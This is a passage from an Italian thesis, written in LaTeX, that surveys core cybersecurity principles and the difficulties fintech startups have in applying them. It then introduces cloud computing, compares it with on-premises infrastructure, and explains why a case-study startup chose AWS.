Nell'analisi e nello studio dell'infrastruttura di una startup fintech, per comprendere le possibili implementazioni a livello di sicurezza dobbiamo prima delineare quali siano i principi di cybersecurity a cui ogni startup, fintech o meno, deve attenersi. In questo capitolo verranno analizzati i principi di cybersecurity più importanti e quali sono le principali sfide che un'azienda di piccole dimensioni può affrontare all'inizio del proprio percorso nell'adozione di tali pratiche.

Questo capitolo esplora i principi fondamentali di sicurezza informatica che ogni organizzazione dovrebbe implementare, con particolare attenzione alle sfide uniche che le startup fintech affrontano nell'adozione di tali pratiche. Il settore fintech, caratterizzato da rapida innovazione e gestione di dati finanziari sensibili, presenta un contesto particolarmente critico dove le best practice di sicurezza si scontrano spesso con le esigenze di velocità di sviluppo, risorse limitate e necessità di time-to-market accelerato.

\section{Triade CIA}
La Triade CIA rappresenta i tre pilastri fondamentali dell'information security: confidentiality (riservatezza), integrity (integrità) e availability (disponibilità) \cite{NIST_SP_1800_26}. Questi principi costituiscono la base su cui costruire qualsiasi strategia di sicurezza informatica robusta.

\begin{itemize}
\item \textbf{Confidentiality}: La riservatezza si concentra sul preservare le restrizioni autorizzate sull'accesso e la divulgazione delle informazioni, inclusi i mezzi per proteggere la privacy personale e le informazioni proprietarie \cite{NIST_SP_1800_26}. Questo principio viene generalmente rispettato tramite la crittografia dei dati, sia a riposo (stored data) che in transito (data in transit), controlli di accesso rigorosi, come liste di controllo degli accessi (ACL), autenticazione a più fattori (MFA) e Role-Based Access Control (RBAC).

text
Nel contesto di una startup fintech, l'implementazione della riservatezza presenta sfide significative. L'accesso ai dati dei clienti e alle informazioni finanziarie deve essere rigorosamente controllato, ma i team piccoli e multifunzionali tipici delle startup spesso portano a una condivisione delle credenziali o all'assegnazione di privilegi eccessivi per "far funzionare le cose rapidamente".

La gestione delle chiavi di cifratura rappresenta un'ulteriore complessità: nelle startup dove i ruoli non sono chiaramente definiti, la responsabilità della gestione delle chiavi può essere ambigua, portando potenzialmente a compromissioni della sicurezza.

\item \textbf{Integrity}: L'integrità dei dati comporta la protezione contro modifiche o distruzioni improprie delle informazioni e garantisce la non ripudiabilità e l'autenticità delle informazioni \cite{NIST_SP_1800_26}. Mantenere l'integrità dei dati è essenziale per prevenire la diffusione di informazioni corrotte o ingannevoli, che potrebbero avere gravi ripercussioni in settori critici come quello sanitario o finanziario. Le tecniche utilizzate per preservare l'integrità includono:
\begin{itemize}
    \item Funzioni di hash crittografiche (es. SHA-256) per verificare che i dati non siano stati alterati.
    \item Firme digitali per autenticare l'origine dei dati e garantirne la non modifica.
    \item Controllo delle versioni per tracciare le modifiche e ripristinare versioni precedenti.
    \item Checksum e meccanismi di rilevamento degli errori.
\end{itemize}

Nel contesto di una startup fintech, l'integrità dei dati è uno di quegli aspetti che va ad inficiare la brand reputation della startup stessa, in quanto la fiducia degli stakeholders si basa anche sulla capacità della startup di conservare i dati dei clienti senza distorsioni e di garantire l'accuratezza nelle transazioni di dati nella maniera più professionale possibile.

\item \textbf{Availability}: Questo principio assicura l'accesso affidabile e tempestivo alle informazioni \cite{NIST_SP_1800_26}. Mira a prevenire interruzioni del servizio, sia dovute a guasti tecnici che ad attacchi malevoli come i Denial-of-Service (DoS) o Distributed Denial-of-Service (DDoS). L'indisponibilità può causare interruzioni operative, perdite economiche e danni alla reputazione. Le strategie per garantire un'elevata disponibilità comprendono:
\begin{itemize}
    \item Sistemi ridondanti (hardware, software, reti) per eliminare singoli punti di fallimento (Single Points of Failure - SPOF).
    \item Backup regolari e piani di disaster recovery (DR) e business continuity (BCP).
    \item Tecniche di bilanciamento del carico (load balancing) per distribuire il traffico di rete.
    \item Misure di protezione contro attacchi DoS/DDoS.
\end{itemize}

Nella maggior parte delle startup, l'infrastruttura di base viene sviluppata considerando una capacità di carico massimo limitato, in quanto nei primi periodi di vita dell'azienda non ci si aspetta un elevato numero di utenti. Proprio per questo motivo, l'infrastruttura presenta un punto vulnerabile che può essere sfruttato dagli attaccanti per mettere a repentaglio l'intero sistema, ad esempio con attacchi DoS/DDoS mirati al perimetro aziendale.
\end{itemize}

\section{Difesa in Profondità (Defense in Depth)}
Il principio di difesa in profondità prevede l'implementazione di una stratificazione delle risorse informatiche di protezione \cite{Cyberment}. Questo approccio permette di rallentare la penetrazione di un eventuale attacco esterno, al fine di avere poi il tempo necessario per una efficace reazione protettiva. La strategia di difesa in profondità fornisce la fondazione per una protezione multidimensionale che include tre componenti mutualmente supportive e rinforzanti: (1) architettura resistente alla penetrazione, (2) operazioni di limitazione dei danni, e (3) progettazione per la cyber resilienza e la sopravvivenza \cite{NIST_SP_800_172}.

Nelle startup fintech, l'implementazione della difesa in profondità è spesso compromessa da vincoli di risorse e pressioni temporali. Ad esempio, mentre una soluzione di autenticazione a più fattori (MFA) è essenziale per proteggere l'accesso a dati finanziari sensibili, una startup potrebbe inizialmente implementare solo l'autenticazione basata su password per accelerare l'onboarding degli utenti, pianificando di aggiungere MFA "in un secondo momento" – un momento che potrebbe non arrivare prima che si verifichi un incidente di sicurezza.

La segmentazione della rete, fondamentale per contenere eventuali violazioni, richiede una progettazione accurata dell'infrastruttura. Tuttavia, nelle fasi iniziali, molte startup fintech operano con architetture di rete piatte per semplificare lo sviluppo e ridurre il sovraccarico operativo, oltre a non disporre del capitale umano competente per gestire una tale complessità.

\section{Principio del Minimo Privilegio}
Il principio del minimo privilegio stabilisce che un sistema dovrebbe limitare i privilegi di accesso degli utenti (o dei processi che agiscono per conto degli utenti) al minimo necessario per svolgere le attività assegnate \cite{NIST_Glossary}. Questo principio dichiara che un'architettura di sicurezza è progettata in modo che a ciascuna entità siano concesse le minime autorizzazioni e risorse di sistema necessarie per svolgere la propria funzione \cite{NIST_Glossary}.

Nelle startup fintech, applicare il principio del minimo privilegio presenta sfide uniche. La cultura focalizzata sulla velocità d'esecuzione spinge spesso a trascurare la sicurezza granulare degli accessi. È forte la tentazione di assegnare privilegi amministrativi ampi e generici per accelerare lo sviluppo, piuttosto che investire tempo nella configurazione di permessi specifici per ogni compito.

Un esempio comune è concedere a tutti gli sviluppatori accesso completo al database di produzione durante la creazione di una nuova dashboard, invece di limitare ciascuno alle sole tabelle o operazioni strettamente necessarie. Sebbene sembri una scorciatoia efficiente, questa pratica crea vulnerabilità critiche: la compromissione di un singolo account può esporre una quantità sproporzionata di dati sensibili, amplificando enormemente i danni di una violazione.

\section{Separazione dei Compiti (Separation of Duties)}
La separazione dei compiti include la divisione delle funzioni di missione o business e le funzioni di supporto tra diverse persone o ruoli, conducendo funzioni di supporto al sistema con individui diversi, e assicurando che il personale di sicurezza che amministra le funzioni di controllo degli accessi non amministri anche le funzioni di audit \cite{OSCAL_Content}. Poiché le violazioni della separazione dei compiti possono estendersi a sistemi e domini di applicazioni, le organizzazioni considerano l'interezza dei sistemi e dei componenti del sistema quando sviluppano politiche sulla separazione dei compiti \cite{OSCAL_Content}.

Nelle startup fintech, dove i team sono piccoli e i ruoli spesso sovrapposti, questo principio è particolarmente difficile da attuare. Ad esempio, in una startup che sviluppa una piattaforma di prestiti P2P, potrebbe esserci un solo ingegnere responsabile sia dell'implementazione del sistema di scoring del credito sia della configurazione dei controlli di sicurezza sullo stesso sistema. Questa concentrazione di responsabilità crea un rischio intrinseco: errori o azioni malevole potrebbero passare inosservati senza un secondo paio di occhi che verifichi il lavoro.

\section{Zero Trust}
Il modello Zero Trust si basa sul concetto che un'organizzazione non dovrebbe fidarsi automaticamente di nulla sia all'interno che all'esterno dei suoi perimetri e deve verificare tutto ciò che tenta di connettersi ai suoi sistemi prima di concedere l'accesso \cite{NIST_SP_800_207}. Zero Trust è una risposta evoluta alle tendenze che includono la migrazione delle risorse di lavoro verso ambienti cloud, lavoratori che operano da dispositivi mobili ovunque si trovino e una crescente collaborazione tra organizzazioni \cite{NIST_SP_800_207}.

Per una startup fintech, l'adozione rigorosa del principio di Zero Trust può rivelarsi particolarmente gravosa. Nelle fasi iniziali, è frequente che l'intera infrastruttura sia gestita da una sola persona, con responsabilità sia di sviluppo sia di amministrazione di rete: questo crea un unico punto di falla, amplificando il rischio di errori di configurazione o di accesso non autorizzato.

Inoltre, le limitate risorse economiche e umane possono rendere difficoltoso implementare soluzioni avanzate di micro-segmentazione, sistemi di Identity and Access Management (IAM) complessi e piattaforme di monitoraggio continuo. Infine, la mancanza di separazione dei compiti e di revisioni periodiche rende più probabile la persistenza di permessi eccessivi o non aggiornati, esponendo i sistemi a potenziali attacchi laterali e perdite di dati sensibili.

\section{Economia del Meccanismo (Economy of Mechanism)}
Il principio di Economia del Meccanismo, formulato da Saltzer e Schroeder, prescrive la progettazione di meccanismi di sicurezza caratterizzati dalla massima semplicità e da dimensioni contenute \cite{Saltzer_Schroeder_1975}. Una complessità ridotta si traduce direttamente in una minore superficie d'attacco potenziale e in una significativa semplificazione delle procedure di audit, verifica formale e manutenzione del codice. Una base di codice concisa e ben strutturata minimizza l'introduzione di dipendenze potenzialmente vulnerabili e attenua la probabilità di errori di configurazione o dell'accumulo di technical debt, che possono compromettere la sicurezza nel lungo termine \cite{Smith_2012_SaltzerReview}.
Strategie implementative includono:
\begin{itemize}
\item Adozione di architetture a microservizi, ove ciascun servizio è caratterizzato da un perimetro di responsabilità chiaramente definito e isolato, limitando l'impatto di una eventuale compromissione.
\item Utilizzo di paradigmi di Infrastructure-as-Code (IaC) per la descrizione dichiarativa, la gestione versionata e l'audit automatizzato dei controlli di sicurezza infrastrutturali.
\end{itemize}
Nel contesto delle startup fintech, la pressione competitiva verso un rapido time-to-market può incentivare l'adozione di soluzioni palliative temporanee ("patching") che incrementano la complessità. Un investimento precoce nella semplicità architetturale e nella modularità si traduce in una significativa riduzione dei costi associati a future attività di refactoring del codice e di penetration testing.
\section{Impostazioni Sicure per Difetto (Fail-Safe Defaults)}
Il principio delle Impostazioni Sicure per Difetto, anch'esso introdotto da Saltzer e Schroeder, stabilisce che le decisioni relative all'accesso debbano fondarsi sulla concessione esplicita di privilegi (modello allow-list), piuttosto che sull'esclusione da un insieme di permessi negati (modello deny-list) \cite{Saltzer_Schroeder_1975}. In assenza di un'autorizzazione esplicita, l'accesso deve essere negato. Il National Institute of Standards and Technology (NIST) riprende concetti affini nel documento SP 800-27, in particolare con il "Principle 16: implement layered security (ensure no single point of vulnerability)" \cite{NIST_SP_800_27rA}, sebbene il focus di Fail-Safe Defaults sia primariamente sulla negazione implicita come comportamento predefinito.
Esempi applicativi comprendono:
\begin{itemize}
\item Configurazione di policy di tipo “Deny All” (o default deny) a livello di firewall di rete e Web Application Firewall (WAF), con l'apertura selettiva delle sole porte, protocolli e regole strettamente necessari per le funzionalità legittime.
\item In contesti cloud, implementazione di policy di Identity and Access Management (IAM) che adottano un approccio di negazione predefinita (e.g., partendo da uno stato di \texttt{NoAction} o \texttt{DenyAll}) e aggiungendo permessi granulari solo per le azioni richieste, aderendo al principio del minimo privilegio.
\end{itemize}
\section{Mediazione Completa (Complete Mediation)}
Il principio di Mediazione Completa impone che ogni tentativo di accesso a qualsiasi oggetto protetto (e.g., file, record di database, risorse API) sia soggetto a una verifica di autorizzazione completa e non aggirabile da parte di un meccanismo di riferimento fidato \cite{Saltzer_Schroeder_1975}. È cruciale evitare di fare affidamento su decisioni di accesso precedentemente memorizzate (caching) che potrebbero essere divenute obsolete, invalidate o manipolate.
Le implementazioni pratiche includono:
\begin{itemize}
\item Implementazione di API Gateway o proxy che validano l'autenticità e l'autorizzazione di ogni singola richiesta API, ad esempio mediante la verifica di token firmati digitalmente (e.g., JSON Web Tokens - JWT).
\item Applicazione di meccanismi di Row-Level Security (RLS) e column-level security, unitamente a security labels a livello di database, per garantire che le policy di accesso siano applicate direttamente ai dati, prevenendo bypass tramite query non autorizzate o accessi diretti.
\end{itemize}
In una piattaforma di gestione dei pagamenti, l'utilizzo di token di sessione a breve scadenza (short-lived tokens) e la richiesta di ri-autenticazione forte per operazioni ad alto rischio (e.g., modifica dei dati beneficiario, trasferimenti di importo elevato) sono misure essenziali per mitigare il rischio di abuso di sessioni compromesse e prevenire l'escalation di privilegi.
\section{Resilienza Cibernetica (Cyber Resiliency)}
La resilienza cibernetica, come definita dal NIST SP 800-160 Vol. 2, è la capacità di un sistema di anticipare, resistere, recuperare e adattarsi a condizioni avverse, stress, attacchi o compromissioni, mantenendo le funzionalità critiche \cite{NIST_SP_800_160v2_2019}. Le strategie fondamentali per conseguire la resilienza includono l'implementazione di ridondanza dinamica dei componenti critici, la capacità di degradazione controllata dei servizi (mantenendo le funzionalità essenziali operative anche in condizioni di parziale fallimento), e l'archiviazione sicura e immutabile dei log di sistema e di sicurezza per supportare le analisi forensi e il ripristino. Per le startup, che frequentemente operano in ambienti mono-cloud e dispongono di team DevOps con risorse limitate, è imperativo integrare fin dalle prime fasi di sviluppo piani di Business Continuity e Disaster Recovery (BC/DR), che includano test regolari dei backup e l'adozione, ove possibile, di pratiche di chaos engineering per validare proattivamente la robustezza del sistema.
\section{Responsabilizzazione e Non-Ripudio (Accountability and Non-Repudiation)}
Il principio di accountability (responsabilizzazione) esige che ogni azione significativa eseguita all'interno del sistema sia univocamente attribuibile a un'identità specifica (utente o processo) e che siano mantenute evidenze probatorie verificabili di tali azioni \cite{Feigenbaum_2020_Accountability}. La non-ripudiabilità (non-repudiation) assicura che le parti coinvolte in una transazione o comunicazione non possano negare la propria partecipazione (e.g., l'invio o la ricezione di dati). Ciò è comunemente ottenuto mediante l'uso di firme digitali, marche temporali qualificate e registri di audit immutabili \cite{NIST_Glossary_NonRepudiation}.
Esempi di meccanismi per garantire accountability e non-repudiation:
\begin{itemize}
\item Generazione di log di audit dettagliati, firmati digitalmente e marcati temporalmente (secondo lo standard RFC 3161), con policy di conservazione conformi ai requisiti normativi e di business (e.g., >= 7 anni per dati finanziari).
\item Utilizzo di sistemi basati su distributed ledger technology (DLT) o, in alternativa, di meccanismi di storage append-only con garanzie di immutabilità (e.g., Amazon S3 Object Lock in modalità compliance o WORM - Write Once Read Many) per la registrazione delle transazioni finanziarie critiche.
\end{itemize}
La conformità a normative stringenti come la PSD2 (Payment Services Directive 2) impone alle startup fintech l'obbligo di garantire e dimostrare la tracciabilità completa (end-to-end) delle operazioni critiche, come i flussi di pagamento e l'accesso ai dati dei clienti, rendendo questi principi particolarmente rilevanti \cite{NIST_SP_800_160v2_2019}.
\section{Privacy by Design (PbD)}
Il framework della Privacy by Design (PbD), introdotto da Ann Cavoukian, propugna l'integrazione della protezione dei dati personali sin dalle prime fasi del ciclo di vita della progettazione di sistemi, processi e infrastrutture tecnologiche. Si articola in sette principi fondanti, tra cui la proattività (non reattività), la privacy come impostazione predefinita (privacy by default), e l'integrazione della privacy nel design (privacy embedded into design) \cite{Cavoukian_PbD_2009}.
Misure concrete per l'attuazione della PbD includono:
\begin{itemize}
\item \textbf{Minimizzazione dei dati (Data Minimization)}: Raccolta, trattamento e conservazione dei soli dati personali strettamente necessari e pertinenti per le finalità dichiarate, legittime e specifiche del servizio.
\item \textbf{Tecniche di Anonimizzazione e Pseudonimizzazione}: Applicazione di tecniche come la differential privacy, k-anonymity, o la pseudonimizzazione per dataset analitici o quando i dati vengono condivisi con terze parti, al fine di ridurre il rischio di re-identificazione.
\item \textbf{Mappatura e revisione continua dei flussi di dati (Data Flow Mapping and Analysis)}: Mantenimento di una documentazione accurata e aggiornata dei flussi di dati personali (Data Processing Records) all'interno dell'organizzazione e revisione periodica, ad esempio ad ogni ciclo di sviluppo (sprint) o modifica significativa del sistema, per identificare e mitigare i rischi per la privacy.
\end{itemize}
Nel settore fintech, l'adozione della PbD è cruciale per assicurare la conformità al Regolamento Generale sulla Protezione dei Dati (GDPR) e alle linee guida emanate dall'European Data Protection Board (EDPB). Questo approccio non solo riduce il rischio di sanzioni amministrative e danni reputazionali, ma contribuisce anche a rafforzare la fiducia degli utenti nella gestione responsabile dei loro dati personali \cite{Cavoukian_PbD_2009}.


\chapter{Principi dell'Infrastruttura Cloud e Scelta di AWS}
\label{ch:cloud-aws}
Dopo aver introdotto le sfide di cybersecurity specifiche per le startup fintech, è fondamentale comprendere il contesto tecnologico in cui queste operano. Oggi, la stragrande maggioranza delle nuove imprese, specialmente nel settore tecnologico e finanziario, basa la propria infrastruttura su modelli di \textbf{cloud computing}. Questo capitolo esplora i motivi di questa scelta, confrontando l'approccio cloud con quello tradizionale on-premises, e introduce \textbf{Amazon Web Services (AWS)}, il provider cloud scelto nel nostro caso studio, delineandone la struttura e i principi fondamentali.
\section{Fondamenti di Cloud Computing}
Il cloud computing è un modello di fruizione IT \textit{"on-demand"} che abilita l'accesso ubiquo e conveniente via rete a un pool condiviso di risorse computazionali configurabili (reti, server, storage, applicazioni e servizi) che possono essere predisposte o rilasciate rapidamente con il minimo sforzo di gestione o intervento del provider \cite{nist800-145}. Questo modello si basa su cinque caratteristiche essenziali (tra cui autoservizio on-demand, \textit{multitenancy}, scalabilità rapida ed elasticità) ed esplica diversi modelli di servizio e modelli di distribuzione \cite{nist800-145}.

I vantaggi chiave del cloud – in particolare rilevanti per una startup fintech – sono la \textit{scalabilità}, la \textit{flessibilità} e l'\textit{elasticità}. La scalabilità consente di aumentare o diminuire capacità computazionale in base alla domanda \cite{digitalocean-cloud}. L'elasticità estende il concetto di scalabilità rendendola dinamica: le risorse possono aumentare o diminuire automaticamente in tempo reale a fronte di picchi o cali di carico \cite{geeksforgeeks_scalability}. Ciò permette di ottimizzare i costi (pagando solo ciò che serve) e di raggiungere prestazioni adeguate anche in caso di crescita rapida del business, scenario tipico di molte startup fintech.

I principali modelli di servizio cloud sono:
\begin{itemize}
    \item \textbf{IaaS (Infrastructure as a Service):} fornisce infrastruttura IT on-demand (server, macchine virtuali, storage, rete) gestita dal provider cloud \cite{ibm_iaas}. L'utente può configurare e usare queste risorse come farebbe on-premises, senza doverle possedere.
    \item \textbf{PaaS (Platform as a Service):} fornisce una piattaforma completa (sistema operativo, middleware, strumenti di sviluppo) pronta all'uso per sviluppare, eseguire e gestire applicazioni \cite{ibm-cloud}. Il provider mantiene lo strato sottostante (infrastruttura e runtime), mentre l'utente si concentra sullo sviluppo del software.
    \item \textbf{SaaS (Software as a Service):} eroga applicazioni software pronte all’uso attraverso il cloud \cite{ibm-cloud}. L’utente finale accede al servizio (es. web app, CRM, gestione documenti) senza gestire infrastruttura o piattaforma sottostante.
\end{itemize}

Analogamente, i modelli di distribuzione definiscono dove e a chi è dedicato l’ambiente cloud. I più comuni sono:
\begin{itemize}
    \item \textbf{Public Cloud:} l’infrastruttura è posseduta da un provider terzo e messa a disposizione del pubblico via Internet \cite{geeksforgeeks_scalability}. Ad esempio, AWS, Azure e Google Cloud offrono servizi condivisi tra molti clienti. I vantaggi includono costi operativi ridotti e alta scalabilità, mentre gli svantaggi possono riguardare il controllo ridotto e la condivisione delle risorse con altri tenant \cite{geeksforgeeks_scalability}.
    \item \textbf{Private Cloud:} l’infrastruttura è dedicata a un’unica organizzazione (sovente gestita internamente o in data center riservati) \cite{geeksforgeeks_scalability}. Offre maggiore controllo e sicurezza (elevata protezione dei dati sensibili), ma richiede investimenti in hardware dedicato e può avere minore scalabilità rispetto al public cloud \cite{geeksforgeeks_scalability}.
    \item \textbf{Hybrid Cloud:} combina ambienti pubblici e privati, permettendo di spostare workload tra essi a seconda delle necessità \cite{geeksforgeeks_scalability}. Una startup fintech potrebbe usare il public cloud per carichi generici e il private cloud per dati regolamentati, ottenendo sia flessibilità che compliance normativa \cite{geeksforgeeks_scalability}. L’hybrid cloud massimizza scalabilità e controllo mantenendo la coerenza con requisiti di sicurezza o normativi.
\end{itemize}
Queste architetture consentono alle startup fintech di avviare servizi IT senza investimenti iniziali in hardware, scalare in base alla domanda del mercato e sperimentare nuovi servizi in maniera agile, mantenendo al tempo stesso contesti isolati (in ambienti privati) per dati sensibili.
\section{Cloud Computing vs Infrastrutture On-Premises}
\label{sec:cloud-vs-onprem}

Tradizionalmente, le aziende gestivano la propria infrastruttura IT internamente, in data center di proprietà o in affitto. Questo modello è noto come \textbf{on-premises}. Richiede l'acquisto di hardware (server, storage, apparati di rete), software (sistemi operativi, licenze), e l'impiego di personale specializzato per la gestione, la manutenzione, gli aggiornamenti e la sicurezza fisica ed operativa.

Il \textbf{cloud computing}, invece, si basa sull'erogazione di risorse informatiche (come potenza di calcolo, storage, database, reti, software, analytics, intelligenza artificiale) tramite Internet, secondo un modello \textit{pay-as-you-go} (paga solo per ciò che consumi). I fornitori di servizi cloud (Cloud Service Provider - CSP), come AWS, Microsoft Azure o Google Cloud Platform, gestiscono l'infrastruttura fisica sottostante, permettendo ai clienti di accedere alle risorse di cui hanno bisogno in modo flessibile e scalabile.

Le differenze principali risiedono in:
\begin{itemize}
    \item \textbf{Costi:} On-premises richiede un ingente investimento iniziale (Capex - Capital Expenditure) per l'acquisto dell'hardware, mentre il cloud trasforma questo costo in una spesa operativa variabile (Opex - Operational Expenditure) basata sul consumo effettivo.
    \item \textbf{Scalabilità:} Il cloud offre scalabilità \textit{elastica}, permettendo di aumentare o diminuire le risorse quasi istantaneamente in base alla domanda. L'infrastruttura on-premises ha una scalabilità limitata e richiede pianificazione e acquisti anticipati per gestire picchi di carico.
    \item \textbf{Manutenzione:} Nel cloud, la manutenzione dell'hardware e dell'infrastruttura di base è responsabilità del provider, liberando il team IT del cliente da queste incombenze.
    \item \textbf{Agilità e Velocità:} Il cloud permette di provisionare nuove risorse in pochi minuti, accelerando notevolmente i cicli di sviluppo e il time-to-market di nuovi prodotti o servizi.
    \item \textbf{Affidabilità e Portata Globale:} I principali CSP dispongono di data center ridondati in diverse regioni geografiche, offrendo alta disponibilità e la possibilità di distribuire applicazioni a livello globale con bassa latenza.
\end{itemize}

\section{Perché le Startup Scelgono il Cloud}
\label{sec:startup-cloud-choice}

Per le startup, specialmente quelle fintech che necessitano di agilità e gestione efficiente delle risorse, il modello cloud offre vantaggi decisivi rispetto all'on-premises:

\begin{itemize}
    \item \textbf{Riduzione delle Barriere all'Ingresso:} L'assenza di grandi investimenti iniziali (Capex) rende accessibili tecnologie avanzate anche a realtà con budget limitati. Si paga solo per l'uso effettivo, allineando i costi alla crescita.
    \item \textbf{Scalabilità Rapida:} Una startup può iniziare con poche risorse e scalare rapidamente man mano che la base utenti o il volume delle transazioni cresce, senza dover sovradimensionare l'infrastruttura all'inizio. Questo è cruciale nel fintech, dove i volumi possono essere imprevedibili.
    \item \textbf{Focalizzazione sul Core Business:} Delegando la gestione dell'infrastruttura al CSP, la startup può concentrare le proprie risorse limitate (tempo e personale) sullo sviluppo del prodotto, sull'acquisizione clienti e sull'innovazione, anziché sulla gestione dei server.
    \item \textbf{Velocità di Innovazione (Time-to-Market)}:** La possibilità di provisionare velocemente ambienti di sviluppo, test e produzione accelera il rilascio di nuove funzionalità, un fattore competitivo essenziale.
    \item \textbf{Accesso a Tecnologie Avanzate:} I CSP offrono servizi gestiti per database, machine learning, big data analytics, sicurezza, ecc., che sarebbero complessi e costosi da implementare e gestire autonomamente on-premises.
    \item \textbf{Affidabilità e Sicurezza di Base:} I CSP investono massicciamente in sicurezza fisica e operativa dei loro data center, offrendo un livello di base di affidabilità e sicurezza spesso superiore a quello che una startup potrebbe permettersi on-premises (sebbene la sicurezza *nel* cloud rimanga responsabilità del cliente).
\end{itemize}
\section{Introduzione ad Amazon Web Services (AWS)}
\label{sec:aws-intro}

Tra i principali fornitori di servizi cloud, \textbf{Amazon Web Services (AWS)} è il leader di mercato e rappresenta la scelta infrastrutturale per moltissime startup a livello globale, incluse quelle operanti nel settore fintech, come nel caso studio di questa tesi. Lanciato nel 2006, AWS offre un portafoglio estremamente ampio e maturo di servizi cloud.

La struttura di AWS si basa su alcuni concetti chiave:

\begin{itemize}
    \item \textbf{Infrastruttura Globale:} AWS opera attraverso una rete mondiale di \textbf{Regioni}. Ogni Regione è un'area geografica fisica separata (es. Irlanda, Francoforte, Nord Virginia). All'interno di ciascuna Regione, esistono multiple \textbf{Zone di Disponibilità (Availability Zones - AZ)}. Una AZ è costituita da uno o più data center discreti, con alimentazione, raffreddamento e rete ridondati. Le AZ all'interno di una Regione sono interconnesse con reti a bassa latenza ma sono fisicamente separate per garantire l'isolamento in caso di guasti (incendi, allagamenti, etc.). Questa architettura permette di costruire applicazioni altamente disponibili e tolleranti ai guasti distribuendole su più AZ.
    \item \textbf{Servizi Fondamentali:} AWS offre centinaia di servizi, ma alcuni sono considerati fondamentali:
        \begin{itemize}
            \item \textbf{Compute:} Servizi per eseguire codice, come \textit{Amazon EC2 (Elastic Compute Cloud)} per macchine virtuali scalabili, \textit{AWS Lambda} per l'esecuzione di codice serverless (senza gestire server), e servizi container come \textit{ECS} ed \textit{EKS}.
            \item \textbf{Storage:} Servizi per l'archiviazione dei dati, come \textit{Amazon S3 (Simple Storage Service)} per lo storage a oggetti altamente duraturo e scalabile, \textit{Amazon EBS (Elastic Block Store)} per volumi a blocchi per le istanze EC2, e \textit{Amazon EFS} per file system condivisi.
            \item \textbf{Database:} Una vasta gamma di database gestiti, inclusi database relazionali (\textit{Amazon RDS}), NoSQL (\textit{Amazon DynamoDB}), data warehouse (\textit{Amazon Redshift}), ecc.
            \item \textbf{Networking:} Servizi per definire e controllare la rete virtuale, come \textit{Amazon VPC (Virtual Private Cloud)} per creare reti isolate, \textit{Elastic Load Balancing (ELB)} per distribuire il traffico, e \textit{AWS Direct Connect} per connessioni dedicate.
            \item \textbf{Security, Identity, \& Compliance:} Servizi per gestire accessi, sicurezza e conformità, come \textit{AWS IAM (Identity and Access Management)}, \textit{AWS KMS (Key Management Service)}, \textit{AWS WAF (Web Application Firewall)}, \textit{Amazon GuardDuty} (rilevamento minacce).
        \end{itemize}
    \item \textbf{Modello Pay-as-you-go:} Come accennato, si paga solo per le risorse effettivamente consumate, senza contratti a lungo termine o costi iniziali (per la maggior parte dei servizi).
    \item \textbf{Modello di Responsabilità Condivisa (Shared Responsibility Model)}:** È cruciale capire che la sicurezza su AWS è una responsabilità condivisa. AWS è responsabile della sicurezza *del* cloud (l'infrastruttura fisica, la rete, l'hypervisor), mentre il cliente è responsabile della sicurezza *nel* cloud (la configurazione dei servizi, la gestione degli accessi, la protezione dei dati, la sicurezza del sistema operativo e delle applicazioni).
\end{itemize}

\section{Il Caso Specifico: AWS per la Startup Fintech}
\label{sec:aws-for-fintech}

La scelta di AWS come infrastruttura cloud per la startup fintech oggetto di questa tesi non è casuale. Oltre ai vantaggi generali del cloud, AWS offre caratteristiche particolarmente rilevanti per il settore finanziario:
\begin{itemize}
    \item \textbf{Maturità e Affidabilità:} Essendo il provider più longevo e diffuso, AWS ha una comprovata esperienza nella gestione di carichi di lavoro critici.
    \item \textbf{Ampiezza dei Servizi:} Il vasto portafoglio permette di costruire architetture complesse e moderne, integrando facilmente servizi per l'analisi dei dati, il machine learning (utile per antifrode o scoring), e la gestione sicura delle transazioni.
    \item \textbf{Supporto alla Compliance:} AWS offre documentazione e servizi che aiutano a soddisfare rigorosi standard di conformità richiesti nel settore finanziario, come PCI DSS, GDPR, ISO 27001, ecc. AWS stessa mantiene numerose certificazioni per la propria infrastruttura.
    \item \textbf{Scalabilità e Performance:} Fondamentali per gestire picchi di transazioni tipici dei servizi finanziari.
    \item \textbf{Ecosistema di Partner:} Esiste un vasto ecosistema di partner tecnologici e di consulenza specializzati su AWS, inclusi quelli con expertise nel settore fintech.
    \item \textbf{Servizi di Sicurezza Avanzati:} AWS offre un set robusto di strumenti nativi per implementare controlli di sicurezza a vari livelli (rete, identità, dati, rilevamento minacce), come vedremo nei capitoli successivi.
\end{itemize}
Nei capitoli seguenti, analizzeremo come l'infrastruttura di questa startup fintech è stata costruita e protetta utilizzando specifici servizi e best practice di AWS.
\section{Infrastruttura Globale AWS}
Amazon Web Services (AWS) dispone di una infrastruttura globale altamente distribuita: ad oggi il cloud AWS è esteso su 36 Regioni geografiche (ciascuna costituita da più Availability Zone) per un totale di 114 Availability Zones lanciate \cite{aws-global-infra}. Ogni Regione AWS rappresenta un’area geografica distinta, isolata dalle altre (per \textit{fault tolerance} e requisiti regolamentari) \cite{aws-global-infra}. All’interno di ogni Regione sono presenti almeno tre \textit{Availability Zone (AZ)}: queste sono sedi fisiche indipendenti, collegate da rete privata ad alta velocità ma isolate a livello di infrastruttura di alimentazione e raffreddamento \cite{aws-global-infra}.

Questo design \textit{multi-AZ} consente la progettazione di applicazioni ad alta disponibilità: infatti ogni AZ è progettata per sopravvivere a guasti localizzati, e le Regioni tra di loro non condividono componenti critici \cite{aws-global-infra}. Secondo AWS, ciò garantisce la “massima disponibilità dell’infrastruttura” e contiene ogni interruzione entro la Regione interessata \cite{aws-global-infra}.

Per supportare applicazioni globali a bassa latenza, AWS integra inoltre \textit{Edge Location} e \textit{Local Zone}. Le Edge Location (oltre 700 nel mondo) sono data center che ospitano servizi come Amazon CloudFront (content delivery network) per consegna rapida di contenuti agli utenti finali. CloudFront instrada le richieste al punto di presenza (edge) più vicino all’utente, minimizzando la latenza \cite{aws-cloudfront}. Le Local Zone sono infrastrutture AWS supplementari posizionate vicino a grandi centri urbani per offrire latenze ancora inferiori in scenari specifici (ad esempio streaming multimediale, gaming o applicazioni IoT ad alte prestazioni).

Il backbone di rete globale AWS è basato su una dorsale in fibra ottica ridondata a 400 Gb/s fra Regioni \cite{aws-network}. Tutti i dati che transitano sulla rete AWS globale fra datacenter e Regioni vengono crittografati a livello fisico \cite{aws-network}, e il cliente mantiene il pieno controllo sui dati (inclusa la facoltà di cifrarli ulteriormente con servizi dedicati). Questa architettura di rete ad alte prestazioni garantisce bassa latenza e alta capacità di trasferimento; AWS sottolinea come sia possibile dispiegare centinaia di server in pochi minuti in qualsiasi zona \cite{aws-network}.

